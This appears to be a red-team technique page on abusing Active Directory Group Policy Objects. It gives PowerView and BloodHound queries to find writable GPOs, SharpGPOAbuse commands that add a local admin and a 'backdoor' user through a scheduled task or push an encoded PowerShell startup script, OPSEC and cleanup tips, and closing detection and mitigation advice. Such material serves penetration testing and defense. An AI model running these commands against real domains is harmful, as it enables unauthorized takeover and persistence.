---
tags:
  - "#type/technique"
  - "#tactic/TA0008"
  - "#technique/T1484"
  - "#stage/lateral-movement"
  - "#stage/privilege-escalation"
  - "#os/windows"
  - "#tool/sharppgoabuse"
  - "#tool/group3r"
  - "#tool/powerview"
  - "#tool/bloodhound"
aliases:
  - GPO Modification
  - Group Policy Tampering
  - Domain Policy Abuse
---

## Technique
___
Group Policy Abuse involves manipulating Group Policy Objects (GPOs) in Active Directory to achieve lateral movement and privilege escalation. When a user or group has modification rights over a GPO that applies to certain computers or users, this access can be leveraged to execute code, add backdoor accounts, modify security settings, or establish persistence.

GPOs are used to centrally manage configurations across an AD environment. They can control various settings including security options, user rights assignments, startup/shutdown scripts, software installation, and more. By abusing write access to these objects, an attacker can potentially gain administrative access to systems where the GPO applies.

## Prerequisites
___

**Access Level:** Varies based on the specific attack, but generally requires:
- Write permissions on a GPO (CreateChild, WriteProperty, etc.)
- Domain user credentials with the ability to modify the target GPO

**System State:** Active Directory environment with Group Policy infrastructure.

**Information:** 
- Knowledge of which GPOs you have access to modify
- Understanding of where these GPOs are applied (which OUs, computers, users)

## Considerations
___

**Impact**

Successful abuse of Group Policy can lead to:
- Complete compromise of all systems where the GPO applies
- Persistent access through various mechanisms (scheduled tasks, startup scripts, etc.)
- Privilege escalation to local administrator or even domain administrator
- Bypass of security controls and monitoring tools

**OPSEC**

- **Change Tracking:** Many organizations monitor GPO changes. Making modifications to production GPOs will likely be logged.
- **Timing:** Group Policy processing occurs at regular intervals (default is 90 minutes with 30-minute randomization) or when manually triggered.
- **Visibility:** Changes to GPOs may be visible to administrators through Group Policy Management Console.
- **Event Logs:** GPO modification creates specific event IDs that may be monitored (5136, 5137, 5141).

## Execution
___

### Identifying Vulnerable GPOs

#### PowerView

Find all GPOs:
```powershell
Get-DomainGPO | Select DisplayName, Name, GPCFileSysPath
```

Check if a specific group has control over any GPOs:
```powershell
$sid = Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
```

Convert GPO GUID to readable name:
```powershell
Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
```

Find which computers a GPO applies to:
```powershell
Get-DomainOU -GPLink "{GPO-GUID}" | Select Name
Get-DomainComputer -SearchBase "LDAP://OU=Workstations,DC=domain,DC=local"
```

#### BloodHound

Query for GPOs you can modify:
```cypher
MATCH p=(u:User)-[r:AllExtendedRights|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|WriteProperty*1..]->(g:GPO) RETURN p
```

Examine GPO details in the "Node Info" tab to see affected objects.

#### Group3r

Analyze GPO security settings:
```bash
group3r.exe -f output.log
```

Scan a domain for GPO weaknesses:
```bash
group3r.exe -d domain.local -u username -p password
```

### Exploiting GPO Access

#### SharpGPOAbuse

Add a local admin:
```powershell
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount DOMAIN\eviluser --GPOName "Vulnerable GPO"
```

Create an immediate scheduled task:
```powershell
SharpGPOAbuse.exe --AddComputerTask --TaskName "Backdoor" --Author DOMAIN\Administrator --Command "cmd.exe" --Arguments "/c net user backdoor Password123! /add" --GPOName "Vulnerable GPO"
```

Configure a user or computer startup script:
```powershell
SharpGPOAbuse.exe --AddUserScript --ScriptName startup.bat --ScriptContents "powershell -enc BASE64_ENCODED_PAYLOAD" --GPOName "Vulnerable GPO"
```

#### Manual GPO Modification

1. Map the SYSVOL share:
```powershell
net use Z: \\domain.local\SYSVOL
```

2. Navigate to the GPO location:
```powershell
cd Z:\domain.local\Policies\{GPO-GUID}
```

3. Modify scripts, add registry settings, etc.

4. Force GPO update on a target:
```powershell
Invoke-GPUpdate -Computer "target-computer" -Force
```

### Cleanup Considerations

- Revert all changes made to GPOs after use
- Remove any added users or scheduled tasks
- Delete any dropped files or scripts
- Use Group Policy versioning to your advantage (previous versions may be available)

## Detection & Mitigation
___

### Detection

- Monitor for GPO modification events (Event IDs 5136, 5137, 5141)
- Track changes to GPOs using Group Policy auditing
- Implement regular GPO reviews and compliance checks
- Monitor for unusual scripts or settings in GPOs
- Watch for changes to administrative group memberships through GPOs

### Mitigation

- Implement least privilege for GPO management
- Use delegated permissions carefully; avoid giving GPO modification rights to regular users
- Regularly audit GPO permissions using tools like Group3r and BloodHound
- Use AGPM (Advanced Group Policy Management) for change control and approval processes
- Implement Protected Groups and AdminSDHolder protection
- Segment administrative functions and create separate OUs with specific GPOs
- Consider using WMI filtering to limit GPO scope
